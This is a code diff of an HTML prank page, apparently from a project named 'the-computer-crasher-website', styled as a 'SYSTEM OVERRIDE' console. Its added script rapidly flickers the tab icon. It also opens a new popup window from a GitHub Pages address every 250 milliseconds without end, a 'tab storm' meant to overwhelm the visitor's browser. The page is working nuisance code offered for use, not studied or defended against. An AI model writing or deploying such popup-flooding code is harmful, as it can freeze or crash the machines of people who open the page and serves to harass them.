@@ -1,34 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MASTER_REPLICATOR</title>
+    <title>REPLICATION_CORE_v2</title>
     <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    
     <style>
-        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #fff; padding: 40px; text-align: center; box-shadow: 0 0 20px #fff; }
-        button { margin-top: 20px; padding: 20px 40px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
-        button:hover { background: #ff0000; color: #fff; }
+        body { 
+            background: #000; color: #fff; font-family: 'Courier New', monospace; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; text-align: center;
+        }
+        .container { border: 2px solid #fff; padding: 60px; box-shadow: 0 0 30px #ff0000; }
+        h1 { font-size: 3rem; margin-bottom: 10px; }
+        button { 
+            padding: 25px 50px; font-size: 1.5rem; background: #fff; color: #000; 
+            border: none; font-weight: bold; cursor: pointer; transition: 0.1s;
+        }
+        button:hover { background: #ff0000; color: #fff; transform: scale(1.1); }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>REPLICATION_CORE</h1>
-        <p>TARGET: notifacations.html</p>
-        <button onclick="start()">EXECUTE SYSTEM</button>
+
+    <div class="container">
+        <h1>SYSTEM OVERRIDE</h1>
+        <p>PROTOCOL: TAB_STORM_INITIATED</p>
+        <button onclick="ignite()">EXECUTE REPLICATION</button>
     </div>
 
     <script>
-        function start() {
-            // 1. Favicon Glitch (Tab icon flickers)
+        function ignite() {
+            // 1. Start the Favicon/Icon Glitch (15 times per second)
+            const fav = document.getElementById('icon');
             setInterval(() => {
                 const p = () => Math.floor(Math.random() * 100);
-                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
-            }, 50);
+                const color = Math.random() > 0.5 ? "white" : "red";
+                fav.href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='${color}'/></svg>`;
+            }, 70);
 
-            // 2. Tab Spammer (Opens the second file 5 times per second)
+            // 2. The Spammer Loop
+            // This pulls directly from your GitHub so it always "connects"
             setInterval(() => {
-                window.open('notifacations.html', '_blank', 'width=400,height=400');
-            }, 200);
+                window.open('https://sevgiceylan1111-spec.github.io/the-computer-crasher-website/notifacations.html', '_blank', 'width=500,height=500');
+            }, 250); 
         }
     </script>
 </body>
